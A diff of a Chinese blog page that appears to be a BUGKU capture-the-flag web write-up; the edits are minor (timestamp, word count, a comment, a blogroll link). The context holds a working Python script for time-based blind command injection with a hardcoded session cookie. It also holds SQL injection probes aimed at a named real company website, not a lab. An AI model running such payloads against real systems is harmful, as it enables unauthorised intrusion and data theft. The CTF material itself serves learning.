@@ -87,7 +87,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/never01.png">
 <meta property="og:image" content="http://www.mr-guo.xin/2018/09/29/BUGKU/10-03/login2.png">
-<meta property="og:updated_time" content="2018-10-05T07:24:30.834Z">
+<meta property="og:updated_time" content="2018-10-06T04:28:35.249Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUGKU">
 <meta name="twitter:description" content="Web">
@@ -381,7 +381,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  694
+                  702
                 </span>
               
 
@@ -445,7 +445,7 @@
   //读取目录
 
 这里自己用python写了个脚本，贴上代码（本人是新手，写的比较粗糙）,首先跑出目录，会发现有flag字样的txt文件，在用脚本读取出文件内容发现flag
-</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">stri=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, '</span></span><br><span class="line">url=<span class="string">'http://123.206.31.85:49165/index.php'</span></span><br><span class="line">data_post= &#123;<span class="string">'c'</span>:<span class="string">'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'hbccmcbln7ul8lc0hgh2q9rrg4'</span>&#125;</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,50):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> stri:</span><br><span class="line">    <span class="comment"># 查看目录</span></span><br><span class="line">    data_post[<span class="string">'c'</span>] = <span class="string">"c=123;a=`ls`;b=\""</span> + y + <span class="string">"\";if [ <span class="variable">$&#123;a:" + str(x) + ":1&#125;</span> == <span class="variable">$b</span> ];then sleep 2;fi"</span> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 查看文件内容</span></span><br><span class="line">    <span class="comment">#data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi"</span></span><br><span class="line">    <span class="built_in">print</span>(data_post)</span><br><span class="line">    r = requests.post(url,data=data_post,cookies=cookies)</span><br><span class="line">    time = r.elapsed.seconds</span><br><span class="line">    <span class="keyword">if</span> time&gt;1:</span><br><span class="line">      result += y</span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">stri=<span class="string">'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;[]|\/+-*.0123456789!@#$%^&amp;*()=_&lt;&gt;, '</span></span><br><span class="line">url=<span class="string">'http://123.206.31.85:49165/index.php'</span></span><br><span class="line">data_post= &#123;<span class="string">'c'</span>:<span class="string">'c=123;a=`ls`;b="s";if [ $&#123;a:1:1&#125; == $b ];then sleep 2;fi'</span>&#125;</span><br><span class="line">cookies=&#123;<span class="string">'PHPSESSID'</span>:<span class="string">'hbccmcbln7ul8lc0hgh2q9rrg4'</span>&#125; <span class="comment">#登录成功后拿取cookie</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(0,50):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> stri:</span><br><span class="line">    <span class="comment"># 查看目录</span></span><br><span class="line">    data_post[<span class="string">'c'</span>] = <span class="string">"c=123;a=`ls`;b=\""</span> + y + <span class="string">"\";if [ <span class="variable">$&#123;a:" + str(x) + ":1&#125;</span> == <span class="variable">$b</span> ];then sleep 2;fi"</span> </span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 查看文件内容</span></span><br><span class="line">    <span class="comment">#data_post['c'] = "c=123;a=`cat xx`;b=\"" + y + "\";if [ $&#123;a:" + str(x) + ":1&#125; == $b ];then sleep 2;fi"</span></span><br><span class="line">    <span class="built_in">print</span>(data_post)</span><br><span class="line">    r = requests.post(url,data=data_post,cookies=cookies)</span><br><span class="line">    time = r.elapsed.seconds</span><br><span class="line">    <span class="keyword">if</span> time&gt;1:</span><br><span class="line">      result += y</span><br><span class="line">      <span class="built_in">break</span></span><br><span class="line">  <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
 <h3 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h3><pre><code>转了一会发现about菜单的news界面可能存在注入点，访问http://www.kabelindo.co.id/readnews.php?id=25 and 1=2发现页面返回异常确认注入点。
 payload：
     ?id=25 order by 5  //确认列数 
@@ -623,6 +623,20 @@ payload：
           
 
           
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://perfect-time.xyz/" title="黑桃" target="_blank">黑桃</a>
+                  </li>
+                
+              </ul>
+            </div>
           
 
           
